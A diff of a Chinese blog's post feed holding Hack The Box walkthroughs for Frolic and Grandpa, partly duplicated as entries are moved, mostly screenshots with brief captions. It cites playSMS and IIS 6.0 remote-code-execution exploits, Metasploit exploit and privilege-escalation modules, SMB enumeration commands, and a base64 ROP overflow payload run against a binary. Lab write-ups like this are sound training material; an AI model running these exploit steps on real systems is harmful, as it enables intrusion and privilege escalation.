+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.771cfv6ozbg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.7gqhymaqwxc0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3kqf6ukuo4k0.webp"
+                     
+                ></p>
+<p>用发现的账号密码去尝试登录admin页面</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.7c46yfexsl00.webp"
+                     
+                ></p>
+<p>密码不对，而且还有登录限制</p>
+<p>test页面是个phpinfo页面</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.785tbb4bxjc0.webp"
+                     
+                ></p>
+<p>dev目录下面应该有东西</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5b4z5rl61ms0.webp"
+                     
+                ></p>
+<p>继续扫</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2wkhq8w82rm0.webp"
+                     
+                ></p>
+<p>dev&#x2F;test下载了一个文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5delpx0glcg0.webp"
+                     
+                ></p>
+<p>没啥信息</p>
+<p>dev&#x2F;backup下发现一个目录</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3sy7hc2cv4a0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.1ediylhza2yo.webp"
+                     
+                ></p>
+<p>打开发现是一个playsms的cms登录框</p>
+<p>看看有没有exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2xvd0apgixo0.webp"
+                     
+                ></p>
+<p>尝试过后发现大多都需要身份验证，最后一个给出了漏洞详细地址</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.4jjdjtk51oo0.webp"
+                     
+                ></p>
+<p><code>https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.12a7tnvnnouo.webp"
+                     
+                ></p>
+<p>貌似是个ssti注入，payload给出来了，试试</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.6yomwwvcfn00.webp"
+                     
+                ></p>
+<p>可行，弹个shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.66a35thjz700.webp"
+                     
+                ></p>
+<p>准备个php反弹文件，让他下载</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3m5tixh2a820.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.29h5sicm3ce8.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.38gpnb2xkhq0.webp"
+                     
+                ></p>
+<p>pkexec和脏牛，但这靶机同样gcc编译问题，无法编译exp，而且，就算在本地静态编译好后让靶机下载，还是无法运行</p>
+<p>在ayush家目录.binary下找到一个rop二进制文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3kdiu0vxw3o0.webp"
+                     
+                ></p>
+<p>按官方解法应该是缓冲区溢出，找了半天找到个wp，但真麻烦啊，而且目前已知消息是官方已经取消了缓冲区溢出考点，所以，懒得动手了，找了个exp直接一把梭哈</p>
+<p><code>https://bigb0ss.medium.com/htb-frolic-writeup-936f81e6a1e0</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.94sd7t5pxr0.webp"
+                     
+                ></p>
+<p>这是python2写的，简单修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5r2x8nwuv800.webp"
+                     
+                ></p>
+<p>之后运行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5ulqti874fw0.webp"
+                     
+                ></p>
+<p><code>echo -n &quot;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=&quot; | base64 -d &gt; /dev/shm/payload</code></p>
+<p><code>./rop $(cat /dev/shm/payload)</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.22r4wq8iw60w.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Grandpa - HackTheBox</title>
+    <url>/post/34d9f4dbd4e3/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.6a922lewo400.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.cn480gcwxag.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.5cda9z27hlg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.30brvtidaq8.webp"
+                     
+                ></p>
+<p>访问80端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.6t5jit49cps0.webp"
+                     
+                ></p>
+<p>这个貌似和之前打过的granny是一致的，同样为iis 6.0</p>
+<p>直接上exp<code>https://github.com/k4u5h41/CVE-2017-7269/blob/main/ii6_reverse_shell.py</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.2ava1o2y69j4.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.1670r178lcxs.webp"
+                     
+                ></p>
+<p>提权</p>
+<p>反弹回来的同样是一个cmd命令框，再次采用iis 6.0 PUT上传</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.46hsuu0scre0.webp"
+                     
+                ></p>
+<p>但是貌似这次不行，死活传不上去</p>
+<p>开启一个smb服务也不行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.311hbj7rlcy0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4m4x0pbmbc80.webp"
+                     
+                ></p>
+<p>实在没法，只能用msf来打了</p>
+<p><code>use exploit/windows/iis/iis_webdav_scstoragepathfromurl</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.3gz8b7o0s2s0.webp"
+                     
+                ></p>
+<p>设置IP和端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.xbwd4qu030g.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.3ra8r8p80g20.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.31umjwfynx40.webp"
+                     
+                ></p>
+<p>进程注入</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4hlkcsjbfek0.webp"
+                     
+                ></p>
+<p>继续提权</p>
+<p><code>run post/multi/recon/local_exploit_suggester</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.ayk89gh87ao.webp"
+                     
+                ></p>
+<p>利用MS15-051提权</p>
+<p><code>use exploit/windows/local/ms15_051_client_copy_image</code></p>
+<p>修改ip端口</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4pvf32ovkq20.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.gz317zw97a8.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.50sz9n78rdo0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.7edx26se64w0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.7g0lpcznj580.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>FriendZone - HackTheBox</title>
     <url>/post/4aaf4f6939f1/</url>
     <content><![CDATA[<p><img  
@@ -5142,411 +5547,6 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/FriendZone/image.3cbubbgprxu0.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Grandpa - HackTheBox</title>
-    <url>/post/34d9f4dbd4e3/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.6a922lewo400.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.cn480gcwxag.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.5cda9z27hlg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.30brvtidaq8.webp"
-                     
-                ></p>
-<p>访问80端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.6t5jit49cps0.webp"
-                     
-                ></p>
-<p>这个貌似和之前打过的granny是一致的，同样为iis 6.0</p>
-<p>直接上exp<code>https://github.com/k4u5h41/CVE-2017-7269/blob/main/ii6_reverse_shell.py</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.2ava1o2y69j4.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.1670r178lcxs.webp"
-                     
-                ></p>
-<p>提权</p>
-<p>反弹回来的同样是一个cmd命令框，再次采用iis 6.0 PUT上传</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.46hsuu0scre0.webp"
-                     
-                ></p>
-<p>但是貌似这次不行，死活传不上去</p>
-<p>开启一个smb服务也不行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.311hbj7rlcy0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4m4x0pbmbc80.webp"
-                     
-                ></p>
-<p>实在没法，只能用msf来打了</p>
-<p><code>use exploit/windows/iis/iis_webdav_scstoragepathfromurl</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.3gz8b7o0s2s0.webp"
-                     
-                ></p>
-<p>设置IP和端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.xbwd4qu030g.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.3ra8r8p80g20.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.31umjwfynx40.webp"
-                     
-                ></p>
-<p>进程注入</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4hlkcsjbfek0.webp"
-                     
-                ></p>
-<p>继续提权</p>
-<p><code>run post/multi/recon/local_exploit_suggester</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.ayk89gh87ao.webp"
-                     
-                ></p>
-<p>利用MS15-051提权</p>
-<p><code>use exploit/windows/local/ms15_051_client_copy_image</code></p>
-<p>修改ip端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.4pvf32ovkq20.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.gz317zw97a8.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.50sz9n78rdo0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.7edx26se64w0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Grandpa/image.7g0lpcznj580.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Frolic - HackTheBox</title>
-    <url>/post/f72fd971108b/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.21ny47h7efwg.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.77794fdpfck0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2zwbmtpnyte0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.638w31tj9bw0.webp"
-                     
-                ></p>
-<p>开放有两个http端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.53o2kmsdbzc0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3qg7me14ndk0.webp"
-                     
-                ></p>
-<p>弱口令登不上，扫目录</p>
-<p>扫目录的过程中，看到445和139开放了Samba，也尝试一下</p>
-<p><code>enum4linux -a 10.10.10.111</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5mui1e34l3g0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.6fupmjimq8s0.webp"
-                     
-                ></p>
-<p><code>smbclient \\\\WORKGROUP\\print -I 10.10.10.111 -N</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.35p5y97603m0.webp"
-                     
-                ></p>
-<p>没用</p>
-<p>扫描目录结果</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2nzwmjnivuu0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.4y3p3luirpc0.webp"
-                     
-                ></p>
-<p>发现一个admin页面登录框</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.1e7td96ef4u8.webp"
-                     
-                ></p>
-<p>不知道密码</p>
-<p>backup下发现user.txt和password.txt</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.771cfv6ozbg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.7gqhymaqwxc0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3kqf6ukuo4k0.webp"
-                     
-                ></p>
-<p>用发现的账号密码去尝试登录admin页面</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.7c46yfexsl00.webp"
-                     
-                ></p>
-<p>密码不对，而且还有登录限制</p>
-<p>test页面是个phpinfo页面</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.785tbb4bxjc0.webp"
-                     
-                ></p>
-<p>dev目录下面应该有东西</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5b4z5rl61ms0.webp"
-                     
-                ></p>
-<p>继续扫</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2wkhq8w82rm0.webp"
-                     
-                ></p>
-<p>dev&#x2F;test下载了一个文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5delpx0glcg0.webp"
-                     
-                ></p>
-<p>没啥信息</p>
-<p>dev&#x2F;backup下发现一个目录</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3sy7hc2cv4a0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.1ediylhza2yo.webp"
-                     
-                ></p>
-<p>打开发现是一个playsms的cms登录框</p>
-<p>看看有没有exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.2xvd0apgixo0.webp"
-                     
-                ></p>
-<p>尝试过后发现大多都需要身份验证，最后一个给出了漏洞详细地址</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.4jjdjtk51oo0.webp"
-                     
-                ></p>
-<p><code>https://research.nccgroup.com/2020/02/11/technical-advisory-playsms-pre-authentication-remote-code-execution-cve-2020-8644/</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.12a7tnvnnouo.webp"
-                     
-                ></p>
-<p>貌似是个ssti注入，payload给出来了，试试</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.6yomwwvcfn00.webp"
-                     
-                ></p>
-<p>可行，弹个shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.66a35thjz700.webp"
-                     
-                ></p>
-<p>准备个php反弹文件，让他下载</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3m5tixh2a820.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.29h5sicm3ce8.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.38gpnb2xkhq0.webp"
-                     
-                ></p>
-<p>pkexec和脏牛，但这靶机同样gcc编译问题，无法编译exp，而且，就算在本地静态编译好后让靶机下载，还是无法运行</p>
-<p>在ayush家目录.binary下找到一个rop二进制文件</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.3kdiu0vxw3o0.webp"
-                     
-                ></p>
-<p>按官方解法应该是缓冲区溢出，找了半天找到个wp，但真麻烦啊，而且目前已知消息是官方已经取消了缓冲区溢出考点，所以，懒得动手了，找了个exp直接一把梭哈</p>
-<p><code>https://bigb0ss.medium.com/htb-frolic-writeup-936f81e6a1e0</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.94sd7t5pxr0.webp"
-                     
-                ></p>
-<p>这是python2写的，简单修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5r2x8nwuv800.webp"
-                     
-                ></p>
-<p>之后运行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.5ulqti874fw0.webp"
-                     
-                ></p>
-<p><code>echo -n &quot;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQaA95bfQeeS3C0r3two=&quot; | base64 -d &gt; /dev/shm/payload</code></p>
-<p><code>./rop $(cat /dev/shm/payload)</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Frolic/image.22r4wq8iw60w.webp"
                      
                 ></p>
 ]]></content>
@@ -5957,252 +5957,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Horizontall - HackTheBox</title>
-    <url>/post/e6803fd388f9/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.1mwfsxtmi09s.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.69kxmaxykt80.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.5rqgfarbnkk0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.2in7n1rq3s40.webp"
-                     
-                ></p>
-<p>添加域名到hosts文件，访问80端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Horizontall/image.38ozehra6di0.webp"
-                     
-                ></p>
-<p>扫目录</p>
-<p><img  
-                     lazyload
-                     alt="image"
